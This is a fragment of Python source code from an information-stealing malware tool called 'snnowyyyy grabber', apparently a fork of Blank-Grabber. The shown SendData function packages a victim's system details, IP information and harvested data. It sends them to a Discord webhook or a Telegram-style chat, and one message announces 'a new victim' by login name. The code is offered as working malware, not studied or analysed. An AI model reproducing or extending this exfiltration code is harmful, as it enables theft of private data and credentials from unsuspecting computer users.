...
Logger = logging.getLogger("snnowyyyy grabber")
...
class BlankGrabber:
    ...
    def SendData(self) -> None: # Sends data to the webhook
        ...
        if Settings.C2[0] == 0: # Discord Webhook
            image_url = "https://pbs.twimg.com/media/DwzNmLaV4AAT1Xz?format=jpg&name=4096x4096"

            payload = {
                "content": "||@everyone||" if Settings.PingMe else "",
                "embeds": [
                    {
                        "title": "snnowyyyy grabber",
                        "description": f"**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**",
                        "url": "https://github.com/Blank-c/Blank-Grabber",
                        "color": 34303,
                        "footer": {
                            "text": "Grabbed by snnowyyyy grabber | https://github.com/snnowyyy/snnowyyyy-grabber"
                        },
                        "thumbnail": {
                            "url": image_url
                        }
            ...
            payload = {
                'caption': f'<b>snnowyyyy Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
                'parse_mode': 'HTML'
            }
